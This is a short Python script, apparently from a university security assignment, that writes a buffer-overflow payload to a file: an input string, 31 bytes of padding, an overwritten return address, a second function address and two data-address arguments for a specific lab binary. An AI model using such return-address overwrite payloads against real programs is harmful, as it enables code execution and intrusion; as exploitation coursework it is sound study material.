import struct

# Convert integer to byte array (integer little endian).
def dw(i):
    return struct.pack("<I",i)

offset = 31

addr1 = 0x00000bb5
# Initialize payload.
payload = ''
payload += 'RD' + '\n'
payload += 'IDA_i5_ch3a7ing' + '\n'
payload += 'A' * offset
payload += dw(addr1)


payload += 'A' * 12

#addr = 0x76173b60  #local
addr = 0x6ff6b2c4	#vmchecker

payload += dw(addr) 
#inca o adresa de return de umplutura
payload += dw(0x00000000) 


# adrsele , prima cu numele louata din executabil(adresa lui prenuma + offset) 
# a doua luata din tahw_ni_hsilgne_kaeps_yeht_od + offset pana la litera w

var_a = 0x0040a184
var_b = 0x0040a18e

payload += dw(var_a)

payload += dw(var_b) 

with open('payload_c', 'wb') as f:
    f.write(payload)
